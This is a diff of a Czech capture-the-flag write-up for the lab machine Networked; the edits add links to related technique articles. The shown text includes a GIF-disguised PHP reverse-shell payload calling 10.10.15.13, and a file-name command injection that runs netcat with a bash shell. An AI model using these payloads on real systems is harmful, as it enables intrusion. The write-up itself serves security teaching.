@@ -9,13 +9,13 @@ tags: ssh sudo php exploit enumeration privesc
 
 Networked je pěkný easy stroj, který ale nespadne na jednom jednorázovém exploitu. První část řetězce je upload bypass ve webové galerii. Druhá část zneužije skript, který periodicky kontroluje názvy uploadovaných souborů a nedostatečně je escapuje. Poslední krok pak vede přes `sudo` na síťový konfigurační skript.
 
-Právě struktura těchto chyb je důležitá. Web dává první RCE jako `apache`, další chyba udělá shell jako `guly` a až teprve potom přijde root. Každá fáze je jiný typ problému a každá vyžaduje jiný způsob uvažování.
+Právě struktura těchto chyb je důležitá. Web dává první RCE jako `apache`, další chyba udělá shell jako `guly` a až teprve potom přijde root. Každá fáze je jiný typ problému a každá vyžaduje jiný způsob uvažování. Networked tak velmi dobře propojuje články [Nebezpečné uploady: polygloty, WAR deploy a plugin upload](/techniky/nebezpecne-uploady-polygloty-war-deploy-a-plugin-upload) a [Zápis do prostoru, který se pak vykoná nebo použije pro autentizaci](/techniky/zapis-do-prostoru-ktery-se-pak-vykona-nebo-pouzije-pro-autentizaci).
 
 ## Počáteční průzkum
 
 ### Apache s uploadem a veřejným `backup/`
 
-Zvenku jsou vidět jen SSH a Apache, takže první útok bude prakticky jistě přes web. Enumerace navíc ukáže zajímavé cesty `upload.php`, `photos.php`, `uploads/` a `backup/`, takže dává smysl zaměřit se na logiku galerie a nahrávání obrázků.
+Zvenku jsou vidět jen SSH a Apache, takže první útok bude prakticky jistě přes web. [Nmap](/nastroje/nmap) a enumerace navíc ukážou zajímavé cesty `upload.php`, `photos.php`, `uploads/` a `backup/`, takže dává smysl zaměřit se na logiku galerie a nahrávání obrázků.
 ```bash
 nmap -p 1-65535 -T4 -A -sC -v $IP
 ```
@@ -35,7 +35,7 @@ http://10.10.10.146/photos.php
 
 ### Upload bypass přes `shell.php.gif`
 
-Záloha webu potvrzuje, že `upload.php` kontroluje hlavně MIME typ a to, zda název končí na povolenou příponu obrázku. To stačí obejít souborem `shell.php.gif`, který pořád vypadá jako GIF, ale zároveň obsahuje PHP payload.
+Záloha webu potvrzuje, že `upload.php` kontroluje hlavně MIME typ a to, zda název končí na povolenou příponu obrázku. To stačí obejít souborem `shell.php.gif`, který pořád vypadá jako GIF, ale zároveň obsahuje PHP payload. Je to přesně ten typ upload bypassu, který rozebírám i v článku [Nebezpečné uploady: polygloty, WAR deploy a plugin upload](/techniky/nebezpecne-uploady-polygloty-war-deploy-a-plugin-upload).
 ```text
 upload Networked-shell.gif
 (GIF89a;<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.13/4000 0>&1'"); ?>)
@@ -49,7 +49,7 @@ Tím vznikne první shell na webu. Na Networked je ale důležité hned pochopit
 
 ### Přes název souboru na `guly`
 
-Další stopa je v tom, že host periodicky kontroluje obsah adresáře `uploads/`. Skript běžící jako `guly` přitom nedostatečně ošetřuje názvy souborů. Pokud se v `uploads/` vytvoří soubor se speciálně zvoleným jménem, skript z něj udělá command injection a spustí příkaz pod účtem `guly`.
+Další stopa je v tom, že host periodicky kontroluje obsah adresáře `uploads/`. Skript běžící jako `guly` přitom nedostatečně ošetřuje názvy souborů. Pokud se v `uploads/` vytvoří soubor se speciálně zvoleným jménem, skript z něj udělá command injection a spustí příkaz pod účtem `guly`. Obranně je to pěkný příklad vzorce popsaného i v článku [Zápis do prostoru, který se pak vykoná nebo použije pro autentizaci](/techniky/zapis-do-prostoru-ktery-se-pak-vykona-nebo-pouzije-pro-autentizaci).
 ```text
 netcat -lvp 4001
 touch /var/www/html/uploads/"; nc 10.10.15.13 4001 -c bash"
